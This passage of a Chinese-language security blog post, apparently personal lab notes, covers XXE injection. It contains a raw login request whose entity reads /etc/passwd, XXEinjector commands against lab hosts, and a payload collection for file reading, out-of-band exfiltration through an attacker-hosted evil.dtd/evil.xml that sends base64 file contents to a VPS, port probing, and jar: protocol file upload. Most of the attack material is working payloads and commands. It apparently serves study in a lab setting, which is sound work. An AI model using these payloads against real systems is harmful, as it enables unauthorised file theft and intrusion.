<pre data-lang="xml" style="background-color:#2b303b;color:#c0c5ce;" class="language-xml "><code class="language-xml" data-lang="xml"><span>POST /doLogin HTTP/1.1
</span><span>Host: 192.168.43.147:8008
</span><span>Content-Length: 169
</span><span>Accept: application/xml, text/xml, */*; q=0.01
</span><span>X-Requested-With: XMLHttpRequest
</span><span>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
</span><span>Content-Type: application/xml;charset=UTF-8
</span><span>Origin: http://192.168.43.147:8008
</span><span>Referer: http://192.168.43.147:8008/
</span><span>Accept-Encoding: gzip, deflate
</span><span>Accept-Language: zh-CN,zh;q=0.9
</span><span>Connection: close
</span><span>
</span><span>&lt;?</span><span style="color:#bf616a;">xml </span><span style="color:#d08770;">version</span><span>=&quot;</span><span style="color:#a3be8c;">1.0</span><span>&quot; </span><span style="color:#d08770;">encoding</span><span>=&quot;</span><span style="color:#a3be8c;">utf-8</span><span>&quot;?&gt;
</span><span>&lt;!</span><span style="color:#b48ead;">DOCTYPE </span><span style="background-color:#bf616a;color:#2b303b;">user[</span><span>
</span><span style="background-color:#bf616a;color:#2b303b;">&lt;</span><span>!ENTITY baz SYSTEM &quot;file:///etc/passwd&quot;&gt;
</span><span>]&gt;
</span><span>&lt;</span><span style="color:#bf616a;">user</span><span>&gt;&lt;</span><span style="color:#bf616a;">username</span><span>&gt;</span><span style="color:#8fa1b3;">&amp;</span><span style="color:#d08770;">baz;</span><span>&lt;/</span><span style="color:#bf616a;">username</span><span>&gt;&lt;</span><span style="color:#bf616a;">password</span><span>&gt;admin&lt;/</span><span style="color:#bf616a;">password</span><span>&gt;&lt;/</span><span style="color:#bf616a;">user</span><span>&gt;
</span></code></pre>
<p>发包后，可在返回包中看到passwd文件的内容<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1624298739780-f2ad89fb-e5b8-40d2-a785-3a27ffc430bd.png#align=left&amp;display=inline&amp;height=1762&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-22%20%E4%B8%8A%E5%8D%882.05.24.png&amp;originHeight=1762&amp;originWidth=2696&amp;size=876145&amp;status=done&amp;style=none&amp;width=2696" alt="截屏2021-06-22 上午2.05.24.png" /></p>
<h2 id="xxezi-dong-hua-zhu-ru">XXE自动化注入</h2>
<p>这里利用XXEinjector进行自动化注入<br />首先抓包，将发送包保存为txt文件<br />如下抓了xxe_php的包和xxe_java的包<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1624363957889-6188a716-184b-4ddd-97fc-2d85e0f1067e.png#align=left&amp;display=inline&amp;height=239&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-22%20%E4%B8%8B%E5%8D%888.12.27.png&amp;originHeight=478&amp;originWidth=242&amp;size=27999&amp;status=done&amp;style=none&amp;width=121" alt="截屏2021-06-22 下午8.12.27.png" /><br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1624364004122-41bfd2a8-f3a8-4c68-9a20-b5dfb1162aed.png#align=left&amp;display=inline&amp;height=972&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-22%20%E4%B8%8B%E5%8D%888.13.03.png&amp;originHeight=972&amp;originWidth=1500&amp;size=255072&amp;status=done&amp;style=none&amp;width=1500" alt="截屏2021-06-22 下午8.13.03.png" /><br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1624364014050-ac9cf45a-5547-4461-bbf5-18bd28bd6938.png#align=left&amp;display=inline&amp;height=972&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-22%20%E4%B8%8B%E5%8D%888.13.10.png&amp;originHeight=972&amp;originWidth=1500&amp;size=257199&amp;status=done&amp;style=none&amp;width=1500" alt="截屏2021-06-22 下午8.13.10.png" /><br />之后就可以打开终端进行注入</p>
<ol>
<li>读取文件内容</li>
</ol>
<p>首先确认，目标服务器中的文件内容如下<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1624364140136-64a585dd-2abc-4a15-8fc1-8707c419f132.png#align=left&amp;display=inline&amp;height=140&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-22%20%E4%B8%8B%E5%8D%888.14.57.png&amp;originHeight=202&amp;originWidth=366&amp;size=30106&amp;status=done&amp;style=none&amp;width=254" alt="截屏2021-06-22 下午8.14.57.png" /><br />之后输入<br />ruby XXEinjector.rb --host=192.168.43.204 --file=java8080.txt --path=c:/flag.txt --verbose<br />可以看到已经得到了文件内容<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1624364227672-33274ae3-fcd0-47eb-a3c3-5ab2e864b717.png#align=left&amp;display=inline&amp;height=1702&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-22%20%E4%B8%8B%E5%8D%888.16.44.png&amp;originHeight=1702&amp;originWidth=3016&amp;size=1155719&amp;status=done&amp;style=none&amp;width=3016" alt="截屏2021-06-22 下午8.16.44.png" /><br />若要读取特殊字符，如PHP文件，则应该在后面加上<br />--phpfilter<br />(仅限php环境)<br />ruby XXEinjector.rb --host=192.168.43.204 --file=java8080.txt --path=c:/flag.txt --verbose --phpfilter</p>
<hr />
<ol start="2">
<li>获取服务器的hash</li>
</ol>
<p>这里同上面获取hash的过程一样，无法成功，metasploit这边获取不到…………</p>
<hr />
<ol start="3">
<li>目录遍历</li>
</ol>
<p>无论是mac本机还是kali虚拟机还是docker下的kali，都无法成功……</p>
<h2 id="metinfo6-0-0-cmslou-dong-shen-ji">metinfo6.0.0 cms漏洞审计</h2>
<p>这个以后再补充吧</p>
<h2 id="xxezong-he-ba-chang-na-flag">xxe综合靶场拿flag</h2>
<p>这个以后再补充吧</p>
<h1 id="suo-she-ji-xxedai-ma">所涉及XXE代码</h1>
<pre data-lang="xml" style="background-color:#2b303b;color:#c0c5ce;" class="language-xml "><code class="language-xml" data-lang="xml"><span>【试验】PHP语言下的XXE漏洞实战的代码：
</span><span>&lt;?</span><span style="color:#bf616a;">xml </span><span style="color:#d08770;">version</span><span>=&#39;</span><span style="color:#a3be8c;">1.0</span><span>&#39;?&gt;
</span><span>&lt;!</span><span style="color:#b48ead;">DOCTYPE </span><span style="color:#bf616a;">user </span><span>[
</span><span>&lt;!</span><span style="color:#b48ead;">ENTITY </span><span style="color:#bf616a;">margin </span><span style="color:#b48ead;">SYSTEM </span><span>&quot;</span><span style="color:#a3be8c;">file:///c:/flag.txt</span><span>&quot;&gt;
</span><span>]&gt;
</span><span>&lt;</span><span style="color:#bf616a;">user</span><span>&gt;&lt;</span><span style="color:#bf616a;">username</span><span>&gt;admin</span><span style="color:#8fa1b3;">&amp;</span><span style="color:#d08770;">margin;</span><span>&lt;/</span><span style="color:#bf616a;">username</span><span>&gt;&lt;</span><span style="color:#bf616a;">password</span><span>&gt;admin&lt;/</span><span style="color:#bf616a;">password</span><span>&gt;&lt;/</span><span style="color:#bf616a;">user</span><span>&gt;
</span><span>
</span><span>
</span><span>XXE读取有特殊字符的文件
</span><span>payload如下
</span><span>&lt;?</span><span style="color:#bf616a;">xml </span><span style="color:#d08770;">version</span><span>=&quot;</span><span style="color:#a3be8c;">1.0</span><span>&quot; </span><span style="color:#d08770;">encoding</span><span>=&quot;</span><span style="color:#a3be8c;">utf-8</span><span>&quot;?&gt; 
</span><span>&lt;!</span><span style="color:#b48ead;">DOCTYPE </span><span style="color:#bf616a;">roottag </span><span>[
</span><span>&lt;!</span><span style="color:#b48ead;">ENTITY </span><span style="color:#8fa1b3;">% </span><span style="color:#bf616a;">start </span><span>&quot;&lt;![</span><span style="color:#b48ead;">CDATA</span><span>[</span><span style="color:#a3be8c;">&quot;&gt;   
</span><span style="color:#a3be8c;">&lt;!ENTITY % goodies SYSTEM &quot;file:///C:/Windows/test.txt&quot;&gt;  
</span><span style="color:#a3be8c;">&lt;!ENTITY % end &quot;</span><span>]]&gt;&quot;&gt;  
</span><span>&lt;!</span><span style="color:#b48ead;">ENTITY </span><span style="color:#8fa1b3;">% </span><span style="color:#bf616a;">dtd </span><span style="color:#b48ead;">SYSTEM </span><span>&quot;</span><span style="color:#a3be8c;">http://127.0.0.1:83/evil.dtd</span><span>&quot;&gt; 
</span><span style="color:#bf616a;">%dtd; 
</span><span>]&gt; 
</span><span>evil.dtd文件内容
</span><span>&lt;?</span><span style="color:#bf616a;">xml </span><span style="color:#d08770;">version</span><span>=&quot;</span><span style="color:#a3be8c;">1.0</span><span>&quot; </span><span style="color:#d08770;">encoding</span><span>=&quot;</span><span style="color:#a3be8c;">UTF-8</span><span>&quot;?&gt;
</span><span style="background-color:#bf616a;color:#2b303b;">&lt;</span><span>!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;
</span><span>ENTITY中定义CDATA
</span><span>
</span><span>XXE无回显读取文件
</span><span>&lt;?</span><span style="color:#bf616a;">xml </span><span style="color:#d08770;">version</span><span>=&quot;</span><span style="color:#a3be8c;">1.0</span><span>&quot;?&gt;
</span><span>&lt;!</span><span style="color:#b48ead;">DOCTYPE </span><span style="color:#bf616a;">test </span><span>[
</span><span>&lt;!</span><span style="color:#b48ead;">ENTITY </span><span style="color:#8fa1b3;">% </span><span style="color:#bf616a;">file </span><span style="color:#b48ead;">SYSTEM </span><span>&quot;</span><span style="color:#a3be8c;">php://filter/read=convert.base64-encode/resource=d:/hacker.txt</span><span>&quot;&gt;
</span><span>&lt;!</span><span style="color:#b48ead;">ENTITY </span><span style="color:#8fa1b3;">% </span><span style="color:#bf616a;">dtd </span><span style="color:#b48ead;">SYSTEM </span><span>&quot;</span><span style="color:#a3be8c;">http://VPS的IP地址/evil.xml</span><span>&quot;&gt;
</span><span style="color:#bf616a;">%dtd;
</span><span style="color:#bf616a;">%send;
</span><span>]&gt;
</span><span>evil.xml内容
</span><span style="background-color:#bf616a;color:#2b303b;">&lt;</span><span>!ENTITY % payload &quot;</span><span style="background-color:#bf616a;color:#2b303b;">&lt;</span><span>!ENTITY </span><span style="color:#8fa1b3;">&amp;#x</span><span style="color:#d08770;">25;</span><span> send SYSTEM &#39;http://VPS的IP地址/?content=%file;&#39;&gt;&quot;&gt;
</span><span>%payload;
</span><span>
</span><span>探测端口1
</span><span>&lt;?</span><span style="color:#bf616a;">xml </span><span style="color:#d08770;">version</span><span>=&#39;</span><span style="color:#a3be8c;">1.0</span><span>&#39;?&gt;
</span><span>&lt;!</span><span style="color:#b48ead;">DOCTYPE </span><span style="color:#bf616a;">user </span><span>[
</span><span>&lt;!</span><span style="color:#b48ead;">ENTITY </span><span style="color:#bf616a;">dtd </span><span style="color:#b48ead;">SYSTEM </span><span>&quot;</span><span style="color:#a3be8c;">http://192.168.0.103</span><span>&quot;&gt;
</span><span>]&gt;
</span><span>&lt;</span><span style="color:#bf616a;">user</span><span>&gt;&lt;</span><span style="color:#bf616a;">username</span><span>&gt;admin</span><span style="color:#8fa1b3;">&amp;</span><span style="color:#d08770;">dtd;</span><span>&lt;/</span><span style="color:#bf616a;">username</span><span>&gt;&lt;</span><span style="color:#bf616a;">password</span><span>&gt;admin&lt;/</span><span style="color:#bf616a;">password</span><span>&gt;&lt;/</span><span style="color:#bf616a;">user
</span><span>
</span><span style="background-color:#bf616a;color:#2b303b;">探测端口2</span><span>
</span><span>&lt;?</span><span style="color:#bf616a;">xml </span><span style="color:#d08770;">version</span><span>=&#39;</span><span style="color:#a3be8c;">1.0</span><span>&#39;?&gt;
</span><span>&lt;!</span><span style="color:#b48ead;">DOCTYPE </span><span style="color:#bf616a;">user </span><span>[
</span><span>&lt;!</span><span style="color:#b48ead;">ENTITY </span><span style="color:#8fa1b3;">% </span><span style="color:#bf616a;">file </span><span style="color:#b48ead;">SYSTEM </span><span>&quot;</span><span style="color:#a3be8c;">php://filter/read=convert.base64-encode/resource=http:IP:PORT</span><span>&quot;&gt;
</span><span>&lt;!</span><span style="color:#b48ead;">ENTITY </span><span style="color:#8fa1b3;">% </span><span style="color:#bf616a;">dtd </span><span style="color:#b48ead;">SYSTEM </span><span>&quot;</span><span style="color:#a3be8c;">http://192.168.0.110/evil.xml</span><span>&quot;&gt;
</span><span style="color:#bf616a;">%dtd;
</span><span style="color:#bf616a;">%send;
</span><span>]&gt;
</span><span>&lt;</span><span style="color:#bf616a;">user</span><span>&gt;&lt;</span><span style="color:#bf616a;">username</span><span>&gt;admin&lt;/</span><span style="color:#bf616a;">username</span><span>&gt;&lt;</span><span style="color:#bf616a;">password</span><span>&gt;admin&lt;/</span><span style="color:#bf616a;">password</span><span>&gt;&lt;/</span><span style="color:#bf616a;">user</span><span>&gt;
</span><span>evil.xml内容
</span><span style="background-color:#bf616a;color:#2b303b;">&lt;</span><span>!ENTITY % payload &quot;</span><span style="background-color:#bf616a;color:#2b303b;">&lt;</span><span>!ENTITY </span><span style="color:#8fa1b3;">&amp;#x</span><span style="color:#d08770;">25;</span><span> send SYSTEM &#39;http://VPS的IP地址/?content=%file;&#39;&gt;&quot;&gt;
</span><span>%payload;
</span><span>
</span><span>jar协议上传文件
</span><span>压缩要上传的文件，末尾加入垃圾字符
</span><span>启动监听：python3 xxe_server xx.zip
</span><span>&lt;?</span><span style="color:#bf616a;">xml </span><span style="color:#d08770;">version</span><span>=&quot;</span><span style="color:#a3be8c;">1.0</span><span>&quot;?&gt;
</span><span>&lt;!</span><span style="color:#b48ead;">DOCTYPE </span><span style="color:#bf616a;">user </span><span>[
</span><span>&lt;!</span><span style="color:#b48ead;">ENTITY </span><span style="color:#bf616a;">margin </span><span style="color:#b48ead;">SYSTEM </span><span>&quot;</span><span style="color:#a3be8c;">jar:http://192.168.0.100:9999/xx.zip!/shell.txt</span><span>&quot;&gt;
</span><span>]&gt;
</span><span>&lt;</span><span style="color:#bf616a;">user</span><span>&gt;&lt;</span><span style="color:#bf616a;">username</span><span>&gt;a</span><span style="color:#8fa1b3;">&amp;</span><span style="color:#d08770;">margin;</span><span>&lt;/</span><span style="color:#bf616a;">username</span><span>&gt;&lt;</span><span style="color:#bf616a;">password</span><span>&gt;a&lt;/</span><span style="color:#bf616a;">password</span><span>&gt;&lt;/</span><span style="color:#bf616a;">user</span><span>&gt;
</span><span>
</span></code></pre>
<h1 id="yi-pian-hao-wen-zhang">一篇好文章</h1>
<p><a href="https://www.yuque.com/attachments/yuque/0/2021/pdf/2424924/1624119577988-3bc0773f-a611-4cff-83b2-cb9cf2c9a930.pdf">一篇文章带你深入理解漏洞之 XXE 漏洞 - 先知社区.pdf</a></p>

    </div>

    
        <footer>
            <hr>
            <p>
                
                    Published by Baz
                
                
                    
                    in <a href="https://baz.ee/categories/an-quan/">安全</a>
                
                
            </p>
            
            
        </footer>
    
</article>


    </body>

</html>
